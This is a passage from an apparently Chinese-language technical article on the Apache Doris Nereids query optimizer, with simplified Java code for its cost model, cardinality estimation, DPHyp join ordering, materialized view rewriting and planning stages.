                <span class="hljs-type">boolean</span> <span class="hljs-variable">rightInput</span> <span class="hljs-operator">=</span> join.right().getOutputSet().containsAll(slots);
                
                <span class="hljs-keyword">if</span> (leftInput &amp;&amp; !rightInput) {
                    leftOnly.add(predicate);
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rightInput &amp;&amp; !leftInput) {
                    rightOnly.add(predicate);
                } <span class="hljs-keyword">else</span> {
                    both.add(predicate);
                }
            }
            
            <span class="hljs-comment">// 构造新计划</span>
            <span class="hljs-type">Plan</span> <span class="hljs-variable">newLeft</span> <span class="hljs-operator">=</span> leftOnly.isEmpty() 
                ? join.left() 
                : <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalFilter</span>&lt;&gt;(leftOnly, join.left());
            
            <span class="hljs-type">Plan</span> <span class="hljs-variable">newRight</span> <span class="hljs-operator">=</span> rightOnly.isEmpty() 
                ? join.right() 
                : <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalFilter</span>&lt;&gt;(rightOnly, join.right());
            
            <span class="hljs-type">Plan</span> <span class="hljs-variable">newJoin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalJoin</span>&lt;&gt;(
                join.getJoinType(),
                join.getHashJoinConjuncts(),
                join.getOtherJoinConjuncts(),
                newLeft,
                newRight
            );
            
            <span class="hljs-keyword">return</span> both.isEmpty() 
                ? newJoin 
                : <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalFilter</span>&lt;&gt;(both, newJoin);
        });
    }
}
</code></pre>
<p><strong>执行效果</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 原始计划</span>
<span class="hljs-keyword">Filter</span>(t1.value <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span> <span class="hljs-keyword">AND</span> t2.status <span class="hljs-operator">=</span> <span class="hljs-string">'active'</span>)
  <span class="hljs-keyword">Join</span>(t1.id <span class="hljs-operator">=</span> t2.id)
    Scan(t1)
    Scan(t2)

<span class="hljs-comment">-- 下推后</span>
<span class="hljs-keyword">Join</span>(t1.id <span class="hljs-operator">=</span> t2.id)
  <span class="hljs-keyword">Filter</span>(t1.value <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span>)
    Scan(t1)
  <span class="hljs-keyword">Filter</span>(t2.status <span class="hljs-operator">=</span> <span class="hljs-string">'active'</span>)
    Scan(t2)
</code></pre>
<hr/>
<h2 data-id="heading-22">4. 代价模型与统计信息（How）</h2>
<h3 data-id="heading-23">4.1 代价模型设计</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/cost/Cost.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cost</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> cpuCost;      <span class="hljs-comment">// CPU 代价</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> memoryCost;   <span class="hljs-comment">// 内存代价</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> networkCost;  <span class="hljs-comment">// 网络代价</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> cost;         <span class="hljs-comment">// 综合代价</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Cost</span><span class="hljs-params">(SessionVariable sessionVariable, <span class="hljs-type">double</span> cpuCost, 
                <span class="hljs-type">double</span> memoryCost, <span class="hljs-type">double</span> networkCost)</span> {
        <span class="hljs-built_in">this</span>.cpuCost = Math.max(<span class="hljs-number">0</span>, cpuCost);
        <span class="hljs-built_in">this</span>.memoryCost = Math.max(<span class="hljs-number">0</span>, memoryCost);
        <span class="hljs-built_in">this</span>.networkCost = Math.max(<span class="hljs-number">0</span>, networkCost);
        
        <span class="hljs-comment">// 加权计算综合代价</span>
        <span class="hljs-type">CostWeight</span> <span class="hljs-variable">costWeight</span> <span class="hljs-operator">=</span> CostWeight.get(sessionVariable);
        <span class="hljs-built_in">this</span>.cost = costWeight.cpuWeight * cpuCost 
                  + costWeight.memoryWeight * memoryCost
                  + costWeight.networkWeight * networkCost;
    }
}
</code></pre>
<p><strong>代价组成</strong>：</p>
<ol>
<li>
<p><strong>CPU 代价</strong>：</p>
<ul>
<li>数据处理量 × CPU 处理因子</li>
<li>考虑算子类型（Scan、Join、Agg）</li>
<li>基数估算的关键输入</li>
</ul>
</li>
<li>
<p><strong>内存代价</strong>：</p>
<ul>
<li>内存占用峰值</li>
<li>Hash Join 的 Build 端大小</li>
<li>聚合的中间状态大小</li>
</ul>
</li>
<li>
<p><strong>网络代价</strong>：</p>
<ul>
<li>Shuffle 数据量</li>
<li>Broadcast 数据量</li>
<li>跨节点数据传输</li>
</ul>
</li>
</ol>
<h3 data-id="heading-24">4.2 CostCalculator 代价计算</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/cost/CostCalculator.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CostCalculator</span> {
    <span class="hljs-comment">/**
     * 计算 GroupExpression 的代价
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Cost <span class="hljs-title function_">calculateCost</span><span class="hljs-params">(ConnectContext connectContext, 
                                    GroupExpression groupExpression,
                                    List&lt;PhysicalProperties&gt; childrenProperties)</span> {
        <span class="hljs-type">PlanContext</span> <span class="hljs-variable">planContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlanContext</span>(connectContext, groupExpression);
        
        <span class="hljs-comment">// 判断是否为 Broadcast Join</span>
        <span class="hljs-keyword">if</span> (childrenProperties.size() &gt;= <span class="hljs-number">2</span>
                &amp;&amp; childrenProperties.get(<span class="hljs-number">1</span>).getDistributionSpec() 
                    <span class="hljs-keyword">instanceof</span> DistributionSpecReplicated) {
            planContext.setBroadcastJoin();
        }
        
        <span class="hljs-comment">// 使用访问者模式计算代价</span>
        <span class="hljs-type">CostModel</span> <span class="hljs-variable">costModel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CostModel</span>(connectContext);
        <span class="hljs-keyword">return</span> groupExpression.getPlan().accept(costModel, planContext);
    }
}
</code></pre>
<h3 data-id="heading-25">4.3 各算子代价计算</h3>
<h4 data-id="heading-26">4.3.1 OlapScan 代价</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Cost <span class="hljs-title function_">visitPhysicalOlapScan</span><span class="hljs-params">(PhysicalOlapScan olapScan, PlanContext context)</span> {
    <span class="hljs-type">Statistics</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> olapScan.getStats();
    
    <span class="hljs-comment">// CPU 代价 = 扫描行数 × 扫描因子</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">cpuCost</span> <span class="hljs-operator">=</span> stats.getRowCount() * CPU_SCAN_COST_FACTOR;
    
    <span class="hljs-comment">// 网络代价 = 数据大小（压缩后）</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">networkCost</span> <span class="hljs-operator">=</span> stats.computeSize() * NETWORK_COST_FACTOR;
    
    <span class="hljs-keyword">return</span> Cost.of(sessionVariable, cpuCost, <span class="hljs-number">0</span>, networkCost);
}
</code></pre>
<h4 data-id="heading-27">4.3.2 HashJoin 代价</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Cost <span class="hljs-title function_">visitPhysicalHashJoin</span><span class="hljs-params">(PhysicalHashJoin&lt;?, ?&gt; hashJoin, 
                                  PlanContext context)</span> {
    <span class="hljs-type">Statistics</span> <span class="hljs-variable">leftStats</span> <span class="hljs-operator">=</span> hashJoin.left().getStats();
    <span class="hljs-type">Statistics</span> <span class="hljs-variable">rightStats</span> <span class="hljs-operator">=</span> hashJoin.right().getStats();
    <span class="hljs-type">Statistics</span> <span class="hljs-variable">outputStats</span> <span class="hljs-operator">=</span> hashJoin.getStats();
    
    <span class="hljs-comment">// Build 端（右表）代价</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">buildCost</span> <span class="hljs-operator">=</span> rightStats.getRowCount() * CPU_BUILD_COST_FACTOR;
    
    <span class="hljs-comment">// Probe 端（左表）代价</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">probeCost</span> <span class="hljs-operator">=</span> leftStats.getRowCount() * CPU_PROBE_COST_FACTOR;
    
    <span class="hljs-comment">// 内存代价 = Build 端数据大小</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">memoryCost</span> <span class="hljs-operator">=</span> rightStats.computeSize();
    
    <span class="hljs-comment">// 网络代价</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">networkCost</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span> (context.isBroadcastJoin()) {
        <span class="hljs-comment">// Broadcast Join: 右表复制到所有节点</span>
        networkCost = rightStats.computeSize() * backendNum;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Shuffle Join: 两表都需要 Shuffle</span>
        networkCost = leftStats.computeSize() + rightStats.computeSize();
    }
    
    <span class="hljs-type">double</span> <span class="hljs-variable">cpuCost</span> <span class="hljs-operator">=</span> buildCost + probeCost;
    <span class="hljs-keyword">return</span> Cost.of(sessionVariable, cpuCost, memoryCost, networkCost);
}
</code></pre>
<h4 data-id="heading-28">4.3.3 HashAggregate 代价</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Cost <span class="hljs-title function_">visitPhysicalHashAggregate</span><span class="hljs-params">(PhysicalHashAggregate&lt;?, ?&gt; agg, 
                                       PlanContext context)</span> {
    <span class="hljs-type">Statistics</span> <span class="hljs-variable">inputStats</span> <span class="hljs-operator">=</span> agg.child().getStats();
    <span class="hljs-type">Statistics</span> <span class="hljs-variable">outputStats</span> <span class="hljs-operator">=</span> agg.getStats();
    
    <span class="hljs-comment">// CPU 代价 = 输入行数 × 聚合因子</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">cpuCost</span> <span class="hljs-operator">=</span> inputStats.getRowCount() * CPU_AGG_COST_FACTOR;
    
    <span class="hljs-comment">// 内存代价 = Hash 表大小（Group By 列 + 聚合状态）</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">memoryCost</span> <span class="hljs-operator">=</span> outputStats.getRowCount() 
                      * (groupByColumnsSize + aggregateStateSize);
    
    <span class="hljs-comment">// 网络代价（两阶段聚合需要 Shuffle）</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">networkCost</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span> (agg.getAggPhase() == AggPhase.LOCAL) {
        <span class="hljs-comment">// 本地聚合输出需要 Shuffle</span>
        networkCost = outputStats.computeSize();
    }
    
    <span class="hljs-keyword">return</span> Cost.of(sessionVariable, cpuCost, memoryCost, networkCost);
}
</code></pre>
<h3 data-id="heading-29">4.4 统计信息（Statistics）</h3>
<p><strong>核心指标</strong>：</p>
<ol>
<li>
<p><strong>行数（RowCount）</strong>：</p>
<ul>
<li>表的总行数</li>
<li>过滤后的行数</li>
<li>Join 后的行数</li>
</ul>
</li>
<li>
<p><strong>列统计信息</strong>：</p>
<ul>
<li>NDV（Number of Distinct Values）：不同值的数量</li>
<li>Min/Max：最小最大值</li>
<li>Null Count：空值数量</li>
</ul>
</li>
<li>
<p><strong>数据大小（DataSize）</strong>：</p>
<ul>
<li>每行平均大小</li>
<li>总数据大小</li>
</ul>
</li>
</ol>
<h4 data-id="heading-30">4.4.1 基数估算（Cardinality Estimation）</h4>
<p><strong>过滤条件选择率</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterEstimation</span> {
    <span class="hljs-comment">/**
     * 计算等值过滤的选择率
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">estimateEqualFilter</span><span class="hljs-params">(ColumnStatistic colStats, Literal value)</span> {
        <span class="hljs-comment">// 选择率 = 1 / NDV</span>
        <span class="hljs-keyword">return</span> <span class="hljs-number">1.0</span> / colStats.getNdv();
    }
    
    <span class="hljs-comment">/**
     * 计算范围过滤的选择率
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">estimateRangeFilter</span><span class="hljs-params">(ColumnStatistic colStats, 
                                             <span class="hljs-type">double</span> min, <span class="hljs-type">double</span> max)</span> {
        <span class="hljs-type">double</span> <span class="hljs-variable">colMin</span> <span class="hljs-operator">=</span> colStats.getMin();
        <span class="hljs-type">double</span> <span class="hljs-variable">colMax</span> <span class="hljs-operator">=</span> colStats.getMax();
        
        <span class="hljs-comment">// 选择率 = (filterMax - filterMin) / (colMax - colMin)</span>
        <span class="hljs-keyword">return</span> (Math.min(max, colMax) - Math.max(min, colMin)) 
             / (colMax - colMin);
    }
}
</code></pre>
<p><strong>Join 基数估算</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JoinEstimation</span> {
    <span class="hljs-comment">/**
     * 估算 Inner Join 的输出行数
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">estimateInnerJoin</span><span class="hljs-params">(Statistics leftStats, 
                                          Statistics rightStats,
                                          List&lt;Expr&gt; joinKeys)</span> {
        <span class="hljs-type">double</span> <span class="hljs-variable">leftRows</span> <span class="hljs-operator">=</span> leftStats.getRowCount();
        <span class="hljs-type">double</span> <span class="hljs-variable">rightRows</span> <span class="hljs-operator">=</span> rightStats.getRowCount();
        
        <span class="hljs-comment">// 计算 Join Key 的选择率</span>
        <span class="hljs-type">double</span> <span class="hljs-variable">selectivity</span> <span class="hljs-operator">=</span> <span class="hljs-number">1.0</span>;
        <span class="hljs-keyword">for</span> (Expr joinKey : joinKeys) {
            <span class="hljs-type">SlotReference</span> <span class="hljs-variable">leftSlot</span> <span class="hljs-operator">=</span> extractLeftSlot(joinKey);
            <span class="hljs-type">SlotReference</span> <span class="hljs-variable">rightSlot</span> <span class="hljs-operator">=</span> extractRightSlot(joinKey);
            
            <span class="hljs-type">double</span> <span class="hljs-variable">leftNdv</span> <span class="hljs-operator">=</span> leftStats.getColumnStatistic(leftSlot).getNdv();
            <span class="hljs-type">double</span> <span class="hljs-variable">rightNdv</span> <span class="hljs-operator">=</span> rightStats.getColumnStatistic(rightSlot).getNdv();
            
            <span class="hljs-comment">// 选择率 = 1 / max(leftNdv, rightNdv)</span>
            selectivity *= <span class="hljs-number">1.0</span> / Math.max(leftNdv, rightNdv);
        }
        
        <span class="hljs-comment">// 输出行数 = leftRows × rightRows × selectivity</span>
        <span class="hljs-keyword">return</span> leftRows * rightRows * selectivity;
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-31">5. Optimizer 优化执行（How）</h2>
<h3 data-id="heading-32">5.1 Optimizer 核心流程</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/jobs/executor/Optimizer.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Optimizer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> CascadesContext cascadesContext;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 初始化 Memo</span>
        cascadesContext.toMemo();
        
        <span class="hljs-comment">// 2. 统计信息推导</span>
        cascadesContext.getMemo().getRoot().getLogicalExpressions().forEach(
            groupExpression -&gt; cascadesContext.pushJob(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeriveStatsJob</span>(groupExpression, cascadesContext.getCurrentJobContext())
            )
        );
        cascadesContext.getJobScheduler().executeJobPool(cascadesContext);
        
        <span class="hljs-comment">// 3. 判断是否使用 DPHyp 优化</span>
        <span class="hljs-keyword">if</span> (isDpHyp(cascadesContext)) {
            dpHypOptimize();
        }
        
        <span class="hljs-comment">// 4. Cascades 优化</span>
        cascadesContext.pushJob(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">OptimizeGroupJob</span>(
                cascadesContext.getMemo().getRoot(), 
                cascadesContext.getCurrentJobContext()
            )
        );
        cascadesContext.getJobScheduler().executeJobPool(cascadesContext);
    }
    
    <span class="hljs-comment">/**
     * 判断是否使用 DPHyp 算法
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isDpHyp</span><span class="hljs-params">(CascadesContext cascadesContext)</span> {
        <span class="hljs-type">SessionVariable</span> <span class="hljs-variable">sessionVariable</span> <span class="hljs-operator">=</span> cascadesContext.getConnectContext()
            .getSessionVariable();
        
        <span class="hljs-type">int</span> <span class="hljs-variable">maxTableCount</span> <span class="hljs-operator">=</span> sessionVariable.getMaxTableCountUseCascadesJoinReorder();
        <span class="hljs-type">int</span> <span class="hljs-variable">continuousJoinNum</span> <span class="hljs-operator">=</span> Memo.countMaxContinuousJoin(
            cascadesContext.getRewritePlan()
        );
        
        <span class="hljs-comment">// Join 数量超过阈值时使用 DPHyp</span>
        <span class="hljs-keyword">return</span> sessionVariable.enableDPHypOptimizer 
            || continuousJoinNum &gt; maxTableCount;
    }
}
</code></pre>
<h3 data-id="heading-33">5.2 DPHyp Join 顺序优化</h3>
<p><strong>DPHyp（Dynamic Programming with Hypergraph）</strong>：</p>
<p><strong>核心思想</strong>：</p>
<ul>
<li>使用动态规划找出最优 Join 顺序</li>
<li>支持超过 10 个表的 Join</li>
<li>生成 Bushy Tree（而非左深树）</li>
</ul>
<p><strong>算法流程</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[提取所有Join节点] --&gt; B[构建超图]
    B --&gt; C[枚举连接对]
    C --&gt; D[计算每个子集的最优计划]
    D --&gt; E[动态规划合并]
    E --&gt; F[选择全局最优]
    
    D -.子问题.-&gt; D
</code></pre>
<p><strong>实现要点</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JoinOrderJob</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Job</span> {
    <span class="hljs-comment">/**
     * DPHyp 优化
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 提取所有 Join 节点</span>
        List&lt;LogicalJoin&gt; joins = extractJoins(group);
        
        <span class="hljs-comment">// 2. 构建超图（Hypergraph）</span>
        <span class="hljs-type">Hypergraph</span> <span class="hljs-variable">hypergraph</span> <span class="hljs-operator">=</span> buildHypergraph(joins);
        
        <span class="hljs-comment">// 3. 动态规划计算最优 Join 顺序</span>
        Map&lt;BitSet, JoinPlan&gt; dpTable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        
        <span class="hljs-comment">// 初始化：单表子集</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; hypergraph.getNodeCount(); i++) {
            <span class="hljs-type">BitSet</span> <span class="hljs-variable">subset</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BitSet</span>();
            subset.set(i);
            dpTable.put(subset, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JoinPlan</span>(hypergraph.getNode(i)));
        }
        
        <span class="hljs-comment">// 枚举子集大小</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>; size &lt;= hypergraph.getNodeCount(); size++) {
            <span class="hljs-comment">// 枚举所有大小为 size 的子集</span>
            <span class="hljs-keyword">for</span> (BitSet subset : enumerateSubsets(size, hypergraph.getNodeCount())) {
                <span class="hljs-comment">// 枚举分割方式</span>
                <span class="hljs-keyword">for</span> (BitSet leftSubset : enumerateSplits(subset)) {
                    <span class="hljs-type">BitSet</span> <span class="hljs-variable">rightSubset</span> <span class="hljs-operator">=</span> (BitSet) subset.clone();
                    rightSubset.andNot(leftSubset);
                    
                    <span class="hljs-comment">// 检查是否可以 Join</span>
                    <span class="hljs-keyword">if</span> (hypergraph.hasEdge(leftSubset, rightSubset)) {
                        <span class="hljs-comment">// 计算代价</span>
                        <span class="hljs-type">JoinPlan</span> <span class="hljs-variable">leftPlan</span> <span class="hljs-operator">=</span> dpTable.get(leftSubset);
                        <span class="hljs-type">JoinPlan</span> <span class="hljs-variable">rightPlan</span> <span class="hljs-operator">=</span> dpTable.get(rightSubset);
                        <span class="hljs-type">JoinPlan</span> <span class="hljs-variable">newPlan</span> <span class="hljs-operator">=</span> buildJoin(leftPlan, rightPlan);
                        
                        <span class="hljs-comment">// 更新最优计划</span>
                        updateBestPlan(dpTable, subset, newPlan);
                    }
                }
            }
        }
        
        <span class="hljs-comment">// 4. 获取全局最优计划</span>
        <span class="hljs-type">BitSet</span> <span class="hljs-variable">allNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BitSet</span>();
        allNodes.set(<span class="hljs-number">0</span>, hypergraph.getNodeCount());
        <span class="hljs-type">JoinPlan</span> <span class="hljs-variable">bestPlan</span> <span class="hljs-operator">=</span> dpTable.get(allNodes);
        
        <span class="hljs-comment">// 5. 替换原 Join 树</span>
        replaceJoinTree(group, bestPlan);
    }
}
</code></pre>
<p><strong>DPHyp vs Cascades</strong>：</p>



































<table><thead><tr><th>特性</th><th>Cascades</th><th>DPHyp</th></tr></thead><tbody><tr><td><strong>适用场景</strong></td><td>&lt; 10 个表 Join</td><td>&gt; 10 个表 Join</td></tr><tr><td><strong>搜索策略</strong></td><td>规则驱动 + 剪枝</td><td>动态规划</td></tr><tr><td><strong>计划形状</strong></td><td>所有可能</td><td>主要是 Bushy Tree</td></tr><tr><td><strong>时间复杂度</strong></td><td>指数级（有剪枝）</td><td>O(3^n)</td></tr><tr><td><strong>优点</strong></td><td>更灵活，探索更全面</td><td>更快，适合大规模 Join</td></tr></tbody></table>
<h3 data-id="heading-34">5.3 物化视图自动改写</h3>
<p><strong>核心思想</strong>：</p>
<ul>
<li>自动识别查询可以使用的物化视图</li>
<li>改写查询计划使用物化视图</li>
<li>提高查询性能</li>
</ul>
<p><strong>改写流程</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[用户查询] --&gt; B[提取查询模式]
    B --&gt; C[匹配物化视图]
    C --&gt; D[生成改写计划]
    D --&gt; E[代价比较]
    E --&gt; F{物化视图更优?}
    F --&gt;|是| G[使用物化视图]
    F --&gt;|否| H[使用原查询]
</code></pre>
<p><strong>改写规则示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MaterializedViewAggregateRule</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMaterializedViewAggregateRule</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;Plan&gt; <span class="hljs-title function_">transform</span><span class="hljs-params">(Plan plan, CascadesContext context)</span> {
        LogicalAggregate&lt;?&gt; aggregate = (LogicalAggregate&lt;?&gt;) plan;
        
        <span class="hljs-comment">// 1. 查找匹配的物化视图</span>
        List&lt;MTMV&gt; matchedMVs = findMatchedMaterializedViews(
            aggregate, 
            context.getMaterializationContexts()
        );
        
        List&lt;Plan&gt; results = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">for</span> (MTMV mv : matchedMVs) {
            <span class="hljs-comment">// 2. 生成改写计划</span>
            <span class="hljs-type">Plan</span> <span class="hljs-variable">rewrittenPlan</span> <span class="hljs-operator">=</span> rewrite(aggregate, mv);
            
            <span class="hljs-keyword">if</span> (rewrittenPlan != <span class="hljs-literal">null</span>) {
                results.add(rewrittenPlan);
            }
        }
        
        <span class="hljs-keyword">return</span> results;
    }
    
    <span class="hljs-keyword">private</span> Plan <span class="hljs-title function_">rewrite</span><span class="hljs-params">(LogicalAggregate&lt;?&gt; query, MTMV mv)</span> {
        <span class="hljs-comment">// 检查 Group By 是否匹配</span>
        <span class="hljs-keyword">if</span> (!matchGroupBy(query, mv)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        <span class="hljs-comment">// 检查聚合函数是否匹配</span>
        <span class="hljs-keyword">if</span> (!matchAggregateFunctions(query, mv)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        <span class="hljs-comment">// 生成从物化视图读取的计划</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalOlapScan</span>(
            mv.getRelatedTable(), 
            <span class="hljs-comment">/* ... */</span>
        );
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-35">6. NereidsPlanner 完整流程（综合）</h2>
<h3 data-id="heading-36">6.1 端到端优化流程</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant User as 用户查询
    participant Parser
    participant Analyzer
    participant Rewriter
    participant Optimizer
    participant PostProcessor
    
    User-&gt;&gt;Parser: SQL文本
    Parser-&gt;&gt;Parser: 语法解析
    Parser-&gt;&gt;Analyzer: LogicalPlan
    
    Analyzer-&gt;&gt;Analyzer: 类型推导
    Analyzer-&gt;&gt;Analyzer: 名称解析
    Analyzer-&gt;&gt;Analyzer: 子查询标准化
    Analyzer-&gt;&gt;Rewriter: 已分析的LogicalPlan
    
    Rewriter-&gt;&gt;Rewriter: 谓词下推
    Rewriter-&gt;&gt;Rewriter: 列裁剪
    Rewriter-&gt;&gt;Rewriter: 常量折叠
    Rewriter-&gt;&gt;Rewriter: 子查询Unnesting
    Rewriter-&gt;&gt;Optimizer: 重写后的LogicalPlan
    
    Optimizer-&gt;&gt;Optimizer: 初始化Memo
    Optimizer-&gt;&gt;Optimizer: 统计信息推导
    Optimizer-&gt;&gt;Optimizer: DPHyp Join优化
    Optimizer-&gt;&gt;Optimizer: Cascades优化
    Optimizer-&gt;&gt;Optimizer: 代价估算
    Optimizer-&gt;&gt;Optimizer: 选择最优计划
    Optimizer-&gt;&gt;PostProcessor: PhysicalPlan
    
    PostProcessor-&gt;&gt;PostProcessor: Runtime Filter生成
    PostProcessor-&gt;&gt;PostProcessor: 分布式属性传播
    PostProcessor-&gt;&gt;User: 最终执行计划
</code></pre>
<h3 data-id="heading-37">6.2 关键优化阶段</h3>
<p><strong>1. Analyze 阶段</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">analyze</span><span class="hljs-params">(<span class="hljs-type">boolean</span> showAnalyzeProcess)</span> {
    cascadesContext.newAnalyzer().analyze();
    
    <span class="hljs-comment">// 主要工作：</span>
    <span class="hljs-comment">// - 类型推导（Type Inference）</span>
    <span class="hljs-comment">// - 名称解析（Name Resolution）</span>
    <span class="hljs-comment">// - 子查询标准化</span>
    <span class="hljs-comment">// - 权限检查</span>
}
</code></pre>
<p><strong>2. Rewrite 阶段</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rewrite</span><span class="hljs-params">(<span class="hljs-type">boolean</span> showRewriteProcess)</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rewriter</span>(cascadesContext).execute();
    
    <span class="hljs-comment">// 主要工作：</span>
    <span class="hljs-comment">// - 谓词下推（Predicate Pushdown）</span>
    <span class="hljs-comment">// - 列裁剪（Column Pruning）</span>
    <span class="hljs-comment">// - 常量折叠（Constant Folding）</span>
    <span class="hljs-comment">// - 子查询去关联（Decorrelation）</span>
    <span class="hljs-comment">// - 表达式简化</span>
}
</code></pre>
<p><strong>3. Optimize 阶段</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">optimize</span><span class="hljs-params">(<span class="hljs-type">boolean</span> showPlanProcess)</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Optimizer</span>(cascadesContext).execute();
    
    <span class="hljs-comment">// 主要工作：</span>
    <span class="hljs-comment">// - Memo 初始化</span>
    <span class="hljs-comment">// - 统计信息推导</span>
    <span class="hljs-comment">// - DPHyp Join 顺序优化</span>
    <span class="hljs-comment">// - Exploration 规则应用</span>
    <span class="hljs-comment">// - Implementation 规则应用</span>
    <span class="hljs-comment">// - 代价计算和最优计划选择</span>
}
</code></pre>
<p><strong>4. PostProcess 阶段</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> PhysicalPlan <span class="hljs-title function_">postProcess</span><span class="hljs-params">(PhysicalPlan physicalPlan)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlanPostProcessors</span>(cascadesContext).process(physicalPlan);
    
    <span class="hljs-comment">// 主要工作：</span>
    <span class="hljs-comment">// - Runtime Filter 生成</span>
